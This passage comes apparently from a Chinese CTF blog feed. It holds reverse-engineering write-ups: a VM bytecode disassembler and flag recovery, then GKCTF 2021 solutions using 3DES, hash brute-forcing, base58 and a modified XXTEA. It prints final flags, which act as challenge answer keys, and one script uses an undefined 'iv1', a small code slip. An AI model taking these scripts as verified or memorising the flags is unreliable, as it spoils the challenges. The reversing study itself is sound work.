class="keyword">if</span> (code[i+<span class="number">1</span>] == <span class="number">0xe1</span>):</span><br><span class="line">            print(<span class="string">&#x27;eax &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(code[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(code[i+<span class="number">1</span>]==<span class="number">0xe2</span>):</span><br><span class="line">            print(<span class="string">&#x27;ebx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(code[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> (code[i + <span class="number">1</span>] == <span class="number">0xe3</span>):</span><br><span class="line">            print(<span class="string">&#x27;ecx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(code[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> (code[i + <span class="number">1</span>] == <span class="number">0xe4</span>):</span><br><span class="line">            print(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(code[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;eax&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(code[i+<span class="number">1</span>]==<span class="number">0xe5</span>):</span><br><span class="line">            print(<span class="string">&#x27;edx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(code[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> (code[i + <span class="number">1</span>] == <span class="number">0xe7</span>):</span><br><span class="line">            print(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(code[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;ebx&#x27;</span>)</span><br><span class="line">        i+=<span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span>(code[i]==<span class="number">0xF2</span>):</span><br><span class="line">        print(<span class="string">&#x27;xor eax ebx&#x27;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> (code[i] == <span class="number">0xF4</span>):</span><br><span class="line">        print(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> (code[i] == <span class="number">0xF5</span>):</span><br><span class="line">        print(<span class="string">&#x27;read_strlen&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> (code[i] == <span class="number">0xF6</span>):</span><br><span class="line">        print(<span class="string">&#x27;jishuan eax=ecx + 2*ebx + 3*eax&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> (code[i] == <span class="number">0xF7</span>):</span><br><span class="line">        print(<span class="string">&#x27;mul eax edx&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> (code[i] == <span class="number">0xF8</span>):</span><br><span class="line">        print(<span class="string">&#x27;swap eax ebx&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;第一部分是假的，就是flag[i]^18</span><br><span class="line">read_strlen</span><br><span class="line">mov eax flag[0]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[32] eax</span><br><span class="line">mov eax flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[33] eax</span><br><span class="line">mov eax flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[34] eax</span><br><span class="line">mov eax flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[35] eax</span><br><span class="line">mov eax flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[36] eax</span><br><span class="line">mov eax flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[37] eax</span><br><span class="line">mov eax flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[38] eax</span><br><span class="line">mov eax flag[7]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[39] eax</span><br><span class="line">mov eax flag[8]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[40] eax</span><br><span class="line">mov eax flag[9]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[41] eax</span><br><span class="line">mov eax flag[10]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[42] eax</span><br><span class="line">mov eax flag[11]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[43] eax</span><br><span class="line">mov eax flag[12]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[44] eax</span><br><span class="line">mov eax flag[13]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[45] eax</span><br><span class="line">mov eax flag[14]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[46] eax</span><br><span class="line">mov eax flag[15]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[47] eax</span><br><span class="line">mov eax flag[16]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[48] eax</span><br><span class="line">mov eax flag[17]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[49] eax</span><br><span class="line">mov eax flag[18]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[50] eax</span><br><span class="line">mov eax flag[19]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[51] eax</span><br><span class="line">nop</span><br><span class="line">&#x2F;&#x2F;下面才是真的</span><br><span class="line">read_strlen</span><br><span class="line">mov eax flag[0]</span><br><span class="line">mov ebx flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[0] eax</span><br><span class="line">mov eax flag[1]</span><br><span class="line">mov ebx flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[1] eax</span><br><span class="line">mov eax flag[2]</span><br><span class="line">mov ebx flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[2] eax</span><br><span class="line">mov eax flag[3]</span><br><span class="line">mov ebx flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[3] eax</span><br><span class="line">mov eax flag[4]</span><br><span class="line">mov ebx flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[4] eax</span><br><span class="line">mov eax flag[5]</span><br><span class="line">mov ebx flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[5] eax</span><br><span class="line">mov eax flag[6]</span><br><span class="line">mov ebx flag[7]</span><br><span class="line">mov ecx flag[8]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">jishuan eax&#x3D;ecx + 2*ebx + 3*eax</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[6] eax</span><br><span class="line">mov eax flag[7]</span><br><span class="line">mov ebx flag[8]</span><br><span class="line">mov ecx flag[9]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">jishuan eax&#x3D;ecx + 2*ebx + 3*eax</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[7] eax</span><br><span class="line">mov eax flag[8]</span><br><span class="line">mov ebx flag[9]</span><br><span class="line">mov ecx flag[10]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">jishuan eax&#x3D;ecx + 2*ebx + 3*eax</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[8] eax</span><br><span class="line">mov eax flag[13]</span><br><span class="line">mov ebx flag[19]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[13] eax</span><br><span class="line">mov flag[19] ebx</span><br><span class="line">mov eax flag[14]</span><br><span class="line">mov ebx flag[18]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[14] eax</span><br><span class="line">mov flag[18] ebx</span><br><span class="line">mov eax flag[15]</span><br><span class="line">mov ebx flag[17]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[15] eax</span><br><span class="line">mov flag[17] ebx</span><br><span class="line">nop</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后分析后，大概加密过程就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> code[]=&#123;  <span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, &#125;;</span><br><span class="line"><span class="keyword">int</span> i ;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]=flag[i]^flag[i+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag[<span class="number">6</span>]=(flag[<span class="number">8</span>] + <span class="number">2</span>*flag[<span class="number">7</span>] + <span class="number">3</span>*flag[<span class="number">6</span>]) * flag[<span class="number">12</span>];</span><br><span class="line">flag[<span class="number">7</span>]=(flag[<span class="number">9</span>] + <span class="number">2</span>*flag[<span class="number">8</span>] + <span class="number">3</span>*flag[<span class="number">7</span>]) * flag[<span class="number">12</span>];</span><br><span class="line">flag[<span class="number">8</span>]=(flag[<span class="number">10</span>] + <span class="number">2</span>*flag[<span class="number">9</span>] + <span class="number">3</span>*flag[<span class="number">8</span>]) * flag[<span class="number">12</span>];</span><br><span class="line"></span><br><span class="line">swap(flag[<span class="number">13</span>] ,flag[<span class="number">19</span>]);</span><br><span class="line">swap(flag[<span class="number">14</span>] ,flag[<span class="number">18</span>]);</span><br><span class="line">swap(flag[<span class="number">15</span>] ,flag[<span class="number">17</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写出解密脚本，需要说一下的是，官方wp的code[6]，code[7]，code[8]是和题目给的不一样的，所以如果没有其他hint的话，应该是爆破来解，因为那个计算函数会导致溢出，但是题目中的这3个数只有一个字节，我们也就爆破这一个字节就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># s=&#x27;Fz&#123;aM&#123;aM|&#125;fMt~suM !!&#x27;</span></span><br><span class="line"><span class="comment"># for i in s:</span></span><br><span class="line"><span class="comment">#     tmp=ord(i)^18</span></span><br><span class="line"><span class="comment">#     print(chr(tmp),end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#fake_flag：This_is_not_flag_233</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># s = Solver()</span></span><br><span class="line"><span class="comment"># a, b, c = Reals(&#x27;a b c&#x27;)</span></span><br><span class="line"><span class="comment"># s.add((c+2*b+3*a)*0x33==0x6dc5)</span></span><br><span class="line"><span class="comment"># s.add((0x72+2*c+3*b)*0x33==0x5b0b)</span></span><br><span class="line"><span class="comment"># s.add((0x33+2*0x72+3*c)*0x33==0x705c)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># if s.check() == sat:</span></span><br><span class="line"><span class="comment">#     m = s.model()</span></span><br><span class="line"><span class="comment">#     print(m)</span></span><br><span class="line"><span class="comment">#     exit()</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     print(&quot;no_sat&quot;)</span></span><br><span class="line"></span><br><span class="line">code=[<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>,</span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line">flag=code</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">120</span>):</span><br><span class="line">            m=((c+<span class="number">2</span>*b+<span class="number">3</span>*a)*<span class="number">0x33</span>)&amp;<span class="number">0xff</span></span><br><span class="line">            n=((<span class="number">0x72</span>+<span class="number">2</span>*c+<span class="number">3</span>*b)*<span class="number">0x33</span>)&amp;<span class="number">0xff</span></span><br><span class="line">            q=((<span class="number">0x33</span>+<span class="number">2</span>*<span class="number">0x72</span>+<span class="number">3</span>*c)*<span class="number">0x33</span>)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span>(m==<span class="number">0xc5</span> <span class="keyword">and</span> n==<span class="number">0x0B</span> <span class="keyword">and</span> q==<span class="number">0x5c</span>):</span><br><span class="line">                print(a,b,c)</span><br><span class="line">                flag[<span class="number">6</span>]=a</span><br><span class="line">                flag[<span class="number">7</span>]=b</span><br><span class="line">                flag[<span class="number">8</span>]=c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    flag[i]=flag[i]^flag[i+<span class="number">1</span>]</span><br><span class="line">flag[<span class="number">13</span>],flag[<span class="number">19</span>]=flag[<span class="number">19</span>],flag[<span class="number">13</span>]</span><br><span class="line">flag[<span class="number">14</span>], flag[<span class="number">18</span>]=flag[<span class="number">18</span>],flag[<span class="number">14</span>]</span><br><span class="line">flag[<span class="number">15</span>], flag[<span class="number">17</span>]=flag[<span class="number">17</span>],flag[<span class="number">15</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#Y0u_hav3_r3v3rs3_1t!</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> vm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF re wp</title>
      <link href="2021/07/13/GKCTF%20re%20wp/"/>
      <url>2021/07/13/GKCTF%20re%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="GKCTF-re-wp"><a href="#GKCTF-re-wp" class="headerlink" title="GKCTF re wp"></a>GKCTF re wp</h1><p>考试时的一个比赛，没怎么做题，现在来补一下，然后写的过程比较简单。</p><p>总结一下学到的新知识把</p><ul><li>解密网站<a href="https://www.chinabaiker.com/cyberchef.htm">https://www.chinabaiker.com/cyberchef.htm</a></li><li>然后Enigma Virtual Box封包后的exe</li><li>tracerpid 反调试</li><li>动调so文件，终于解决了，虽然目前只能调x86的，但也不错了，后面去问问其他师傅怎么弄的其他环境。</li></ul><h2 id="Crash"><a href="#Crash" class="headerlink" title="Crash"></a>Crash</h2><p>一个go语言写的程序，用ida7.6直接打开就可以还原符号表了。</p><p>程序逻辑也比较清晰，先判断格式，然后长度为43，分4段加密，3DES加密然后base64处理，hash-sha256，hash-sha512，hash-md5。</p><p>3DES找到密文和key，iv后直接用脚本解就行，在线网站也行<a href="https://www.chinabaiker.com/cyberchef.htm">https://www.chinabaiker.com/cyberchef.htm</a>，hash就爆破吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str1 =<span class="string">&quot;o/aWPjNNxMPZDnJlNp0zK5+NLPC4Tv6kqdJqjkL0XkA=&quot;</span></span><br><span class="line">s=base64.b64decode(str1)</span><br><span class="line">c = s</span><br><span class="line">key = <span class="string">b&#x27;WelcomeToTheGKCTF2021XXX&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;1Ssecret&#x27;</span></span><br><span class="line"></span><br><span class="line">des = DES3.new(key, DES3.MODE_CBC, iv1)</span><br><span class="line"></span><br><span class="line">m = des.decrypt(c)</span><br><span class="line"></span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">                <span class="built_in">str</span> = <span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)+<span class="built_in">chr</span>(d)</span><br><span class="line">                flag = hashlib.md5(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="string">&#x27;ff6e2fd78aca4736037258f0ede4ecf0&#x27;</span>:</span><br><span class="line">                    print(<span class="built_in">str</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">                <span class="built_in">str</span> = <span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)+<span class="built_in">chr</span>(d)</span><br><span class="line">                flag = hashlib.sha256(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="string">&#x27;6e2b55c78937d63490b4b26ab3ac3cb54df4c5ca7d60012c13d2d1234a732b74&#x27;</span>:</span><br><span class="line">                    print(<span class="built_in">str</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># GKCTF&#123;87f645e9-b628-412f-9d7a-e402f20af940&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="QQQQT"><a href="#QQQQT" class="headerlink" title="QQQQT"></a>QQQQT</h2><p>Enigma Virtual Box封包后的exe，还是第一次遇到，下载EnigmaVBUnpacker解包，然后分析解包后的exe，发现就是一个base58，表都没有改，写个python解一下就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;56fkoP8KhwCf3v7CEz&#x27;</span></span><br><span class="line">print(base58.b58decode(s))</span><br><span class="line"><span class="comment">#12t4tww3r5e77</span></span><br></pre></td></tr></table></figure><h2 id="SoMuchCode"><a href="#SoMuchCode" class="headerlink" title="SoMuchCode"></a>SoMuchCode</h2><p>程序难点在垃圾代码太多，处理方法的话就是动调输入值，然后去找到调用输入的地方，会发现就是一个xxtea加密，通过不断的调试发现只是改了dealt，只是xxtea中间的for循环直接没了，变成了一步步的。然后后面就需要得到密文了，密文是在后面调试过程中生成的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *code ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *key ,<span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> next,end,sum;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> rounds,e,delta=<span class="number">0x33445566</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    rounds=<span class="number">6</span>+<span class="number">52</span>/n;</span><br><span class="line">    sum=rounds*delta;    </span><br><span class="line">    next=code[<span class="number">0</span>];<span class="comment">//设置next为code的第一个 </span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e=(sum&gt;&gt;<span class="number">2</span>)&amp;<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)<span class="comment">//解密最后一个到第二个</span></span><br><span class="line">        &#123;</span><br><span class="line">            end=code[i<span class="number">-1</span>];</span><br><span class="line">            code[i]-=(( (end&gt;&gt;<span class="number">5</span>^next&lt;&lt;<span class="number">2</span>)  + (next&gt;&gt;<span class="number">3</span>^end&lt;&lt;<span class="number">4</span>) ) ^ ( (sum^next) + (key[(i&amp;<span class="number">3</span>)^e]^end) ))&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">            next=code[i];</span><br><span class="line">        &#125;</span><br><span class="line">        end=code[n<span class="number">-1</span>];</span><br><span class="line">        code[<span class="number">0</span>]-=(( (end&gt;&gt;<span class="number">5</span>^next&lt;&lt;<span class="number">2</span>) + (next&gt;&gt;<span class="number">3</span>^end&lt;&lt;<span class="number">4</span>) ) ^ ( (sum^next) +(key[i&amp;<span class="number">3</span>^e]^end) ))&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">        next=code[<span class="number">0</span>];</span><br><span class="line">        sum-=delta;</span><br><span class="line">    &#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> 